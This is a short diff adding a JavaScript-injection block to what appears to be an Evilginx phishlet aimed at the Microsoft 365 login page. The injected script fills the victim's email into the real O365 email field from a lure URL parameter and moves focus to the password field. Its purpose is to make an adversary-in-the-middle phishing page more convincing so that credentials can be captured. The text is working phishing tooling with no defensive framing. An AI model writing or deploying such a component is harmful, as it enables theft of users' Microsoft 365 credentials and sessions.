@@ -1,0 +1,16 @@
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/", "/common/login"]  # O365 login endpoints
+    trigger_params: ["email"]  # URL param to pull the email from
+    script: |
+      function autofillEmail() {
+        var emailField = document.querySelector("#i0116");  // O365 email input ID
+        var passwordField = document.querySelector("#i0118");  // O365 password input ID
+        if (emailField && passwordField) {
+          emailField.value = "{email}";  // {email} is replaced by Evilginx with the lure param
+          passwordField.focus();  // Shift focus to PW field
+          return;
+        }
+        setTimeout(autofillEmail, 100);  // Retry if fields not loaded yet
+      }
+      setTimeout(autofillEmail, 100);  // Initial delay for page load
